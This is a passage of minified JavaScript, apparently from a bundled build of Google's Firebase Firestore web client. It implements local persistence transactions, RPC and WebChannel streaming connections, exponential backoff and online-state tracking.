gz(n,e){const t=Be(n);return t.persistence.runTransaction("Get next mutation batch","readonly",r=>(e===void 0&&(e=Dv),t.mutationQueue.getNextMutationBatchAfterBatchId(r,e)))}function mz(n,e){const t=Be(n);return t.persistence.runTransaction("Allocate target","readwrite",r=>{let i;return t.Hr.getTargetData(r,e).next(s=>s?(i=s,re.resolve(i)):t.Hr.allocateTargetId(r).next(o=>(i=new Gs(e,o,"TargetPurposeListen",r.currentSequenceNumber),t.Hr.addTargetData(r,i).next(()=>i))))}).then(r=>{const i=t.Ts.get(r.targetId);return(i===null||r.snapshotVersion.compareTo(i.snapshotVersion)>0)&&(t.Ts=t.Ts.insert(r.targetId,r),t.Is.set(e,r.targetId)),r})}async function Dy(n,e,t){const r=Be(n),i=r.Ts.get(e),s=t?"readwrite":"readwrite-primary";try{t||await r.persistence.runTransaction("Release target",s,o=>r.persistence.referenceDelegate.removeTarget(o,i))}catch(o){if(!gc(o))throw o;me(Gv,`Failed to update sequence numbers for target ${e}: ${o}`)}r.Ts=r.Ts.remove(e),r.Is.delete(i.target)}function hS(n,e,t){const r=Be(n);let i=De.min(),s=Ye();return r.persistence.runTransaction("Execute query","readwrite",o=>function(l,u,h){const f=Be(l),p=f.Is.get(h);return p!==void 0?re.resolve(f.Ts.get(p)):f.Hr.getTargetData(u,h)}(r,o,Ri(e)).next(a=>{if(a)return i=a.lastLimboFreeSnapshotVersion,r.Hr.getMatchingKeysForTargetId(o,a.targetId).next(l=>{s=l})}).next(()=>r.Ps.getDocumentsMatchingQuery(o,e,t?i:De.min(),t?s:Ye())).next(a=>(yz(r,rF(e),a),{documents:a,gs:s})))}function yz(n,e,t){let r=n.Es.get(e)||De.min();t.forEach((i,s)=>{s.readTime.compareTo(r)>0&&(r=s.readTime)}),n.Es.set(e,r)}class fS{constructor(){this.activeTargetIds=cF()}Ds(e){this.activeTargetIds=this.activeTargetIds.add(e)}vs(e){this.activeTargetIds=this.activeTargetIds.delete(e)}bs(){const e={activeTargetIds:this.activeTargetIds.toArray(),updateTimeMs:Date.now()};return JSON.stringify(e)}}class wz{constructor(){this.ho=new fS,this.Po={},this.onlineStateHandler=null,this.sequenceNumberHandler=null}addPendingMutation(e){}updateMutationState(e,t,r){}addLocalQueryTarget(e,t=!0){return t&&this.ho.Ds(e),this.Po[e]||"not-current"}updateQueryState(e,t,r){this.Po[e]=t}removeLocalQueryTarget(e){this.ho.vs(e)}isLocalQueryTarget(e){return this.ho.activeTargetIds.has(e)}clearQueryState(e){delete this.Po[e]}getAllActiveQueryTargets(){return this.ho.activeTargetIds}isActiveQueryTarget(e){return this.ho.activeTargetIds.has(e)}start(){return this.ho=new fS,Promise.resolve()}handleUserChange(e,t,r){}setOnlineState(e){}shutdown(){}writeSequenceNumber(e){}notifyBundleLoaded(e){}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class vz{To(e){}shutdown(){}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const dS="ConnectivityMonitor";class pS{constructor(){this.Io=()=>this.Eo(),this.Ao=()=>this.Ro(),this.Vo=[],this.mo()}To(e){this.Vo.push(e)}shutdown(){window.removeEventListener("online",this.Io),window.removeEventListener("offline",this.Ao)}mo(){window.addEventListener("online",this.Io),window.addEventListener("offline",this.Ao)}Eo(){me(dS,"Network connectivity changed: AVAILABLE");for(const e of this.Vo)e(0)}Ro(){me(dS,"Network connectivity changed: UNAVAILABLE");for(const e of this.Vo)e(1)}static D(){return typeof window<"u"&&window.addEventListener!==void 0&&window.removeEventListener!==void 0}}/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let vf=null;function Oy(){return vf===null?vf=function(){return 268435456+Math.round(2147483648*Math.random())}():vf++,"0x"+vf.toString(16)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Om="RestConnection",_z={BatchGetDocuments:"batchGet",Commit:"commit",RunQuery:"runQuery",RunAggregationQuery:"runAggregationQuery"};class Ez{get fo(){return!1}constructor(e){this.databaseInfo=e,this.databaseId=e.databaseId;const t=e.ssl?"https":"http",r=encodeURIComponent(this.databaseId.projectId),i=encodeURIComponent(this.databaseId.database);this.po=t+"://"+e.host,this.yo=`projects/${r}/databases/${i}`,this.wo=this.databaseId.database===$d?`project_id=${r}`:`project_id=${r}&database_id=${i}`}So(e,t,r,i,s){const o=Oy(),a=this.bo(e,t.toUriEncodedString());me(Om,`Sending RPC '${e}' ${o}:`,a,r);const l={"google-cloud-resource-prefix":this.yo,"x-goog-request-params":this.wo};return this.Do(l,i,s),this.vo(e,a,l,r).then(u=>(me(Om,`Received RPC '${e}' ${o}: `,u),u),u=>{throw Kl(Om,`RPC '${e}' ${o} failed with error: `,u,"url: ",a,"request:",r),u})}Co(e,t,r,i,s,o){return this.So(e,t,r,i,s)}Do(e,t,r){e["X-Goog-Api-Client"]=function(){return"gl-js/ fire/"+dc}(),e["Content-Type"]="text/plain",this.databaseInfo.appId&&(e["X-Firebase-GMPID"]=this.databaseInfo.appId),t&&t.headers.forEach((i,s)=>e[s]=i),r&&r.headers.forEach((i,s)=>e[s]=i)}bo(e,t){const r=_z[e];return`${this.po}/v1/${t}:${r}`}terminate(){}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Iz{constructor(e){this.Fo=e.Fo,this.Mo=e.Mo}xo(e){this.Oo=e}No(e){this.Bo=e}Lo(e){this.ko=e}onMessage(e){this.qo=e}close(){this.Mo()}send(e){this.Fo(e)}Qo(){this.Oo()}$o(){this.Bo()}Uo(e){this.ko(e)}Ko(e){this.qo(e)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Yn="WebChannelConnection";class Sz extends Ez{constructor(e){super(e),this.forceLongPolling=e.forceLongPolling,this.autoDetectLongPolling=e.autoDetectLongPolling,this.useFetchStreams=e.useFetchStreams,this.longPollingOptions=e.longPollingOptions}vo(e,t,r,i){const s=Oy();return new Promise((o,a)=>{const l=new rk;l.setWithCredentials(!0),l.listenOnce(ik.COMPLETE,()=>{try{switch(l.getLastErrorCode()){case Wf.NO_ERROR:const h=l.getResponseJson();me(Yn,`XHR for RPC '${e}' ${s} received:`,JSON.stringify(h)),o(h);break;case Wf.TIMEOUT:me(Yn,`RPC '${e}' ${s} timed out`),a(new we(ie.DEADLINE_EXCEEDED,"Request time out"));break;case Wf.HTTP_ERROR:const f=l.getStatus();if(me(Yn,`RPC '${e}' ${s} failed with status:`,f,"response text:",l.getResponseText()),f>0){let p=l.getResponseJson();Array.isArray(p)&&(p=p[0]);const w=p==null?void 0:p.error;if(w&&w.status&&w.message){const x=function(I){const A=I.toLowerCase().replace(/_/g,"-");return Object.values(ie).indexOf(A)>=0?A:ie.UNKNOWN}(w.status);a(new we(x,w.message))}else a(new we(ie.UNKNOWN,"Server responded with status "+l.getStatus()))}else a(new we(ie.UNAVAILABLE,"Connection failed."));break;default:Ne()}}finally{me(Yn,`RPC '${e}' ${s} completed.`)}});const u=JSON.stringify(i);me(Yn,`RPC '${e}' ${s} sending request:`,i),l.send(t,"POST",u,r,15)})}Wo(e,t,r){const i=Oy(),s=[this.po,"/","google.firestore.v1.Firestore","/",e,"/channel"],o=ak(),a=ok(),l={httpSessionIdParam:"gsessionid",initMessageHeaders:{},messageUrlParams:{database:`projects/${this.databaseId.projectId}/databases/${this.databaseId.database}`},sendRawJson:!0,supportsCrossDomainXhr:!0,internalChannelParams:{forwardChannelRequestTimeoutMs:6e5},forceLongPolling:this.forceLongPolling,detectBufferingProxy:this.autoDetectLongPolling},u=this.longPollingOptions.timeoutSeconds;u!==void 0&&(l.longPollingTimeout=Math.round(1e3*u)),this.useFetchStreams&&(l.useFetchStreams=!0),this.Do(l.initMessageHeaders,t,r),l.encodeInitMessageHeaders=!0;const h=s.join("");me(Yn,`Creating RPC '${e}' stream ${i}: ${h}`,l);const f=o.createWebChannel(h,l);let p=!1,w=!1;const x=new Iz({Fo:I=>{w?me(Yn,`Not sending because RPC '${e}' stream ${i} is closed:`,I):(p||(me(Yn,`Opening RPC '${e}' stream ${i} transport.`),f.open(),p=!0),me(Yn,`RPC '${e}' stream ${i} sending:`,I),f.send(I))},Mo:()=>f.close()}),k=(I,A,b)=>{I.listen(A,E=>{try{b(E)}catch(O){setTimeout(()=>{throw O},0)}})};return k(f,Zc.EventType.OPEN,()=>{w||(me(Yn,`RPC '${e}' stream ${i} transport opened.`),x.Qo())}),k(f,Zc.EventType.CLOSE,()=>{w||(w=!0,me(Yn,`RPC '${e}' stream ${i} transport closed`),x.Uo())}),k(f,Zc.EventType.ERROR,I=>{w||(w=!0,Kl(Yn,`RPC '${e}' stream ${i} transport errored:`,I),x.Uo(new we(ie.UNAVAILABLE,"The operation could not be completed")))}),k(f,Zc.EventType.MESSAGE,I=>{var A;if(!w){const b=I.data[0];st(!!b);const E=b,O=(E==null?void 0:E.error)||((A=E[0])===null||A===void 0?void 0:A.error);if(O){me(Yn,`RPC '${e}' stream ${i} received error:`,O);const W=O.status;let q=function(B){const z=ln[B];if(z!==void 0)return zk(z)}(W),L=O.message;q===void 0&&(q=ie.INTERNAL,L="Unknown error status: "+W+" with message "+O.message),w=!0,x.Uo(new we(q,L)),f.close()}else me(Yn,`RPC '${e}' stream ${i} received:`,b),x.Ko(b)}}),k(a,sk.STAT_EVENT,I=>{I.stat===Sy.PROXY?me(Yn,`RPC '${e}' stream ${i} detected buffering proxy`):I.stat===Sy.NOPROXY&&me(Yn,`RPC '${e}' stream ${i} detected no buffering proxy`)}),setTimeout(()=>{x.$o()},0),x}}function Bm(){return typeof document<"u"?document:null}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function ig(n){return new xF(n,!0)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class nC{constructor(e,t,r=1e3,i=1.5,s=6e4){this.Ti=e,this.timerId=t,this.Go=r,this.zo=i,this.jo=s,this.Ho=0,this.Jo=null,this.Yo=Date.now(),this.reset()}reset(){this.Ho=0}Zo(){this.Ho=this.jo}Xo(e){this.cancel();const t=Math.floor(this.Ho+this.e_()),r=Math.max(0,Date.now()-this.Yo),i=Math.max(0,t-r);i>0&&me("ExponentialBackoff",`Backing off for ${i} ms (base delay: ${this.Ho} ms, delay with jitter: ${t} ms, last attempt: ${r} ms ago)`),this.Jo=this.Ti.enqueueAfterDelay(this.timerId,i,()=>(this.Yo=Date.now(),e())),this.Ho*=this.zo,this.Ho<this.Go&&(this.Ho=this.Go),this.Ho>this.jo&&(this.Ho=this.jo)}t_(){this.Jo!==null&&(this.Jo.skipDelay(),this.Jo=null)}cancel(){this.Jo!==null&&(this.Jo.cancel(),this.Jo=null)}e_(){return(Math.random()-.5)*this.Ho}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const gS="PersistentStream";class rC{constructor(e,t,r,i,s,o,a,l){this.Ti=e,this.n_=r,this.r_=i,this.connection=s,this.authCredentialsProvider=o,this.appCheckCredentialsProvider=a,this.listener=l,this.state=0,this.i_=0,this.s_=null,this.o_=null,this.stream=null,this.__=0,this.a_=new nC(e,t)}u_(){return this.state===1||this.state===5||this.c_()}c_(){return this.state===2||this.state===3}start(){this.__=0,this.state!==4?this.auth():this.l_()}async stop(){this.u_()&&await this.close(0)}h_(){this.state=0,this.a_.reset()}P_(){this.c_()&&this.s_===null&&(this.s_=this.Ti.enqueueAfterDelay(this.n_,6e4,()=>this.T_()))}I_(e){this.E_(),this.stream.send(e)}async T_(){if(this.c_())return this.close(0)}E_(){this.s_&&(this.s_.cancel(),this.s_=null)}d_(){this.o_&&(this.o_.cancel(),this.o_=null)}async close(e,t){this.E_(),this.d_(),this.a_.cancel(),this.i_++,e!==4?this.a_.reset():t&&t.code===ie.RESOURCE_EXHAUSTED?(ys(t.toString()),ys("Using maximum backoff delay to prevent overloading the backend."),this.a_.Zo()):t&&t.code===ie.UNAUTHENTICATED&&this.state!==3&&(this.authCredentialsProvider.invalidateToken(),this.appCheckCredentialsProvider.invalidateToken()),this.stream!==null&&(this.A_(),this.stream.close(),this.stream=null),this.state=e,await this.listener.Lo(t)}A_(){}auth(){this.state=1;const e=this.R_(this.i_),t=this.i_;Promise.all([this.authCredentialsProvider.getToken(),this.appCheckCredentialsProvider.getToken()]).then(([r,i])=>{this.i_===t&&this.V_(r,i)},r=>{e(()=>{const i=new we(ie.UNKNOWN,"Fetching auth token failed: "+r.message);return this.m_(i)})})}V_(e,t){const r=this.R_(this.i_);this.stream=this.f_(e,t),this.stream.xo(()=>{r(()=>this.listener.xo())}),this.stream.No(()=>{r(()=>(this.state=2,this.o_=this.Ti.enqueueAfterDelay(this.r_,1e4,()=>(this.c_()&&(this.state=3),Promise.resolve())),this.listener.No()))}),this.stream.Lo(i=>{r(()=>this.m_(i))}),this.stream.onMessage(i=>{r(()=>++this.__==1?this.g_(i):this.onNext(i))})}l_(){this.state=5,this.a_.Xo(async()=>{this.state=0,this.start()})}m_(e){return me(gS,`close with error: ${e}`),this.stream=null,this.close(4,e)}R_(e){return t=>{this.Ti.enqueueAndForget(()=>this.i_===e?t():(me(gS,"stream callback skipped by getCloseGuardedDispatcher."),Promise.resolve()))}}}class Tz extends rC{constructor(e,t,r,i,s,o){super(e,"listen_stream_connection_backoff","listen_stream_idle","health_check_timeout",t,r,i,o),this.serializer=s}f_(e,t){return this.connection.Wo("Listen",e,t)}g_(e){return this.onNext(e)}onNext(e){this.a_.reset();const t=RF(this.serializer,e),r=function(s){if(!("targetChange"in s))return De.min();const o=s.targetChange;return o.targetIds&&o.targetIds.length?De.min():o.readTime?Mi(o.readTime):De.min()}(e);return this.listener.p_(t,r)}y_(e){const t={};t.database=Ly(this.serializer),t.addTarget=function(s,o){let a;const l=o.target;if(a=ky(l)?{documents:PF(s,l)}:{query:LF(s,l).ht},a.targetId=o.targetId,o.resumeToken.approximateByteSize()>0){a.resumeToken=Hk(s,o.resumeToken);const u=My(s,o.expectedCount);u!==null&&(a.expectedCount=u)}else if(o.snapshotVersion.compareTo(De.min())>0){a.readTime=Yd(s,o.snapshotVersion.toTimestamp());const u=My(s,o.expectedCount);u!==null&&(a.expectedCount=u)}return a}(this.serializer,e);const r=OF(this.serializer,e);r&&(t.labels=r),this.I_(t)}w_(e){const t={};t.database=Ly(this.serializer),t.removeTarget=e,this.I_(t)}}class Az extends rC{constructor(e,t,r,i,s,o){super(e,"write_stream_connection_backoff","write_stream_idle","health_check_timeout",t,r,i,o),this.serializer=s}get S_(){return this.__>0}start(){this.lastStreamToken=void 0,super.start()}A_(){this.S_&&this.b_([])}f_(e,t){return this.connection.Wo("Write",e,t)}g_(e){return st(!!e.streamToken),this.lastStreamToken=e.streamToken,st(!e.writeResults||e.writeResults.length===0),this.listener.D_()}onNext(e){st(!!e.streamToken),this.lastStreamToken=e.streamToken,this.a_.reset();const t=NF(e.writeResults,e.commitTime),r=Mi(e.commitTime);return this.listener.v_(r,t)}C_(){const e={};e.database=Ly(this.serializer),this.I_(e)}b_(e){const t={streamToken:this.lastStreamToken,writes:e.map(r=>MF(this.serializer,r))};this.I_(t)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class bz{}class xz extends bz{constructor(e,t,r,i){super(),this.authCredentials=e,this.appCheckCredentials=t,this.connection=r,this.serializer=i,this.F_=!1}M_(){if(this.F_)throw new we(ie.FAILED_PRECONDITION,"The client has already been terminated.")}So(e,t,r,i){return this.M_(),Promise.all([this.authCredentials.getToken(),this.appCheckCredentials.getToken()]).then(([s,o])=>this.connection.So(e,Ny(t,r),i,s,o)).catch(s=>{throw s.name==="FirebaseError"?(s.code===ie.UNAUTHENTICATED&&(this.authCredentials.invalidateToken(),this.appCheckCredentials.invalidateToken()),s):new we(ie.UNKNOWN,s.toString())})}Co(e,t,r,i,s){return this.M_(),Promise.all([this.authCredentials.getToken(),this.appCheckCredentials.getToken()]).then(([o,a])=>this.connection.Co(e,Ny(t,r),i,o,a,s)).catch(o=>{throw o.name==="FirebaseError"?(o.code===ie.UNAUTHENTICATED&&(this.authCredentials.invalidateToken(),this.appCheckCredentials.invalidateToken()),o):new we(ie.UNKNOWN,o.toString())})}terminate(){this.F_=!0,this.connection.terminate()}}class kz{constructor(e,t){this.asyncQueue=e,this.onlineStateHandler=t,this.state="Unknown",this.x_=0,this.O_=null,this.N_=!0}B_(){this.x_===0&&(this.L_("Unknown"),this.O_=this.asyncQueue.enqueueAfterDelay("online_state_timeout",1e4,()=>(this.O_=null,this.k_("Backend didn't respond within 10 seconds."),this.L_("Offline"),Promise.resolve())))}q_(e){this.state==="Online"?this.L_("Unknown"):(this.x_++,this.x_>=1&&(this.Q_(),this.k_(`Connection failed 1 times. Most recent error: ${e.toString()}`),this.L_("Offline")))}set(e){this.Q_(),this.x_=0,e==="Online"&&(this.N_=!1),this.L_(e)}L_(e){e!==this.state&&(this.state=e,this.onlineStateHandler(e))}k_(e){const t=`Could not reach Cloud Firestore backend. ${e}
This typically indicates that your device does not have a healthy Internet connection at the moment. The client will operate in offline mode until it is able to successfully connect to the backend.`;this.N_?(ys(t),this.N_=!1):me("OnlineStateTracker",t)}Q_(){this.O_!==null&&(this.O_.cancel(),this.O_=null)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const ya="RemoteStore";class Cz{constructor(e,t,r,i,s){this.localStore=e,this.datastore=t,this.asyncQueue=r,this.remoteSyncer={},this.U_=[],this.K_=new Map,this.W_=new Set,this.G_=[],this.z_=s,this.z_.To(o=>{r.enqueueAndForget(async()=>{ka(this)&&(me(ya,"Restarting streams for network reachability change."),await async function(l){const u=Be(l);u.W_.add(4),await Th(u),u.j_.set("Unknown"),u.W_.delete(4),await sg(u)}(this))})}),this.j_=new kz(r,i)}}async function sg(n){if(ka(n))for(const e of n.G_)await e(!0)}async function Th(n){for(const e of n.G_)await e(!1)}function iC(n,e){const t=Be(n);t.K_.has(e.targetId)||(t.K_.set(e.targetId,e),Jv(t)?Zv(t):mc(t).c_()&&Yv(t,e))}function Qv(n,e){const t=Be(n),r=mc(t);t.K_.delete(e),r.c_()&&sC(t,e),t.K_.size===0&&(r.c_()?r.P_():ka(t)&&t.j_.set("Unknown"))}function Yv(n,e){if(n.H_.Ne(e.targetId),e.resumeToken.approximateByteSize()>0||e.snapshotVersion.compareTo(De.min())>0){const t=n.remoteSyncer.getRemoteKeysForTarget(e.targetId).size;e=e.withExpectedCount(t)}mc(n).y_(e)}function sC(n,e){n.H_.Ne(e),mc(n).w_(e)}function Zv(n){n.H_=new SF({getRemoteKeysForTarget:e=>n.remoteSyncer.getRemoteKeysForTarget(e),lt:e=>n.K_.get(e)||null,it:()=>n.datastore.serializer.databaseId}),mc(n).start(),n.j_.B_()}function Jv(n){return ka(n)&&!mc(n).u_()&&n.K_.size>0}function ka(n){return Be(n).W_.size===0}function oC(n){n.H_=void 0}async function Rz(n){n.j_.set("Online")}async function Mz(n){n.K_.forEach((e,t)=>{Yv(n,e)})}async function Nz(n,e){oC(n),Jv(n)?(n.j_.q_(e),Zv(n)):n.j_.set("Unknown")}async function Pz(n,e,t){if(n.j_.set("Online"),e instanceof $k&&e.state===2&&e.cause)try{await async function(i,s){const o=s.cause;for(const a of s.targetIds)i.K_.has(a)&&(await i.remoteSyncer.rejectListen(a,o),i.K_.delete(a),i.H_.removeTarget(a))}(n,e)}catch(r){me(ya,"Failed to remove targets %s: %s ",e.targetIds.join(","),r),await Jd(n,r)}else if(e instanceof Kf?n.H_.We(e):e instanceof Wk?n.H_.Ze(e):n.H_.je(e),!t.isEqual(De.min()))try{const r=await tC(n.localStore);t.compareTo(r)>=0&&await function(s,o){const a=s.H_.ot(o);return a.targetChanges.forEach((l,u)=>{if(l.resumeToken.approximateByteSize()>0){const h=s.K_.get(u);h&&s.K_.set(u,h.withResumeToken(l.resumeToken,o))}}),a.targetMismatches.forEach((l,u)=>{const h=s.K_.get(l);if(!h)return;s.K_.set(l,h.withResumeToken(Fn.EMPTY_BYTE_STRING,h.snapshotVersion)),sC(s,l);const f=new Gs(h.target,l,u,h.sequenceNumber);Yv(s,f)}),s.remoteSyncer.applyRemoteEvent(a)}(n,t)}catch(r){me(ya,"Failed to raise snapshot:",r),await Jd(n,r)}}async function Jd(n,e,t){if(!gc(e))throw e;n.W_.add(1),await Th(n),n.j_.set("Offline"),t||(t=()=>tC(n.localStore)),n.asyncQueue.enqueueRetryable(async()=>{me(ya,"Retrying IndexedDB access"),await t(),n.W_.delete(1),await sg(n)})}function aC(n,e){return e().catch(t=>Jd(n,t,e))}async function og(n){const e=Be(n),t=vo(e);let r=e.U_.length>0?e.U_[e.U_.length-1].batchId:Dv;for(;Lz(e);)try{const i=await gz(e.localStore,r);if(i===null){e.U_.length===0&&t.P_();break}r=i.batchId,Dz(e,i)}catch(i){await Jd(e,i)}lC(e)&&cC(e)}function Lz(n){return ka(n)&&n.U_.length<10}function Dz(n,e){n.U_.push(e);const t=vo(n);t.c_()&&t.S_&&t.b_(e.mutations)}function lC(n){return ka(n)&&!vo(n).u_()&&n.U_.length>0}function cC(n){vo(n).start()}async function Oz(n){vo(n).C_()}async function Bz(n){const e=vo(n);for(const t of n.U_)e.b_(t.mutations)}async function Uz(n,e,t){const r=n.U_.shift(),i=zv.from(r,e,t);await aC(n,()=>n.remoteSyncer.applySuccessfulWrite(i)),await og(n)}async function jz(n,e){e&&vo(n).S_&&await async function(r,i){if(function(o){return EF(o)&&o!==ie.ABORTED}(i.code)){const s=r.U_.shift();vo(r).h_(),await aC(r,()=>r.remoteSyncer.rejectFailedWrite(s.batchId,i)),await og(r)}}(n,e),lC(n)&&cC(n)}async function mS(n,e){const t=Be(n);t.asyncQueue.verifyOperationInProgress(),me(ya,"RemoteStore received new credentials");const r=ka(t);t.W_.add(3),await Th(t),r&&t.j_.set("Unknown"),await t.remoteSyncer.handleCredentialChange(e),t.W_.delete(3),await sg(t)}async function Vz(n,e){const t=Be(n);e?(t.W_.delete(2),await sg(t)):e||(t.W_.add(2),await Th(t),t.j_.set("Unknown"))}function mc(n){return n.J_||(n.J_=function(t,r,i){const s=Be(t);return s.M_(),new Tz(r,s.connection,s.authCredentials,s.appCheckCredentials,s.serializer,i)}(n.datastore,n.asyncQueue,{xo:Rz.bind(null,n),No:Mz.bind(null,n),Lo:Nz.bind(null,n),p_:Pz.bind(null,n)}),n.G_.push(async e=>{e?(n.J_.h_(),Jv(n)?Zv(n):n.j_.set("Unknown")):(await n.J_.stop(),oC(n))})),n.J_}function vo(n){return n.Y_||(n.Y_=function(t,r,i){const s=Be(t);return s.M_(),new Az(r,s.connection,s.authCredentials,s.appCheckCredentials,s.serializer,i)}(n.datastore,n.asyncQueue,{xo:()=>Promise.resolve(),No:Oz.bind(null,n),Lo:jz.bind(null,n),D_:Bz.bind(null,n),v_:Uz.bind(null,n)}),n.G_.push(async e=>{e?(n.Y_.h_(),await og(n)):(await n.Y_.stop(),n.U_.length>0&&(me(ya,`Stopping write stream with ${n.U_.length} pending writes`),n.U_=[]))})),n.Y_}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Xv{constructor(e,t,r,i,s){this.asyncQueue=e,this.timerId=t,this.targetTimeMs=r,this.op=i,this.removalCallback=s,this.deferred=new as,this.then=this.deferred.promise.then.bind(this.deferred.promise),this.deferred.promise.catch(o=>{})}get promise(){return this.deferred.promise}static createAndSchedule(e,t,r,i,s){const o=Date.now()+r,a=new Xv(e,t,o,i,s);return a.start(r),a}start(e){this.timerHandle=setTimeout(()=>this.handleDelayElapsed(),e)}skipDelay(){return this.handleDelayElapsed()}cancel(e){this.timerHandle!==null&&(this.clearTimeout(),this.deferred.reject(new we(ie.CANCELLED,"Operation cancelled"+(e?": "+e:""))))}handleDelayElapsed(){this.asyncQueue.enqueueAndForget(()=>this.timerHandle!==null?(this.clearTimeout(),this.op().then(e=>this.deferred.resolve(e))):Promise.resolve())}clearTimeout(){this.timerHandle!==null&&(this.removalCallback(this),clearTimeout(this.timerHandle),this.timerHandle=null)}}function e1(n,e){if(ys("AsyncQueue",`${e}: ${n}`),gc(n))return new we(ie.UNAVAILABLE,`${e}: ${n}`);throw n}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
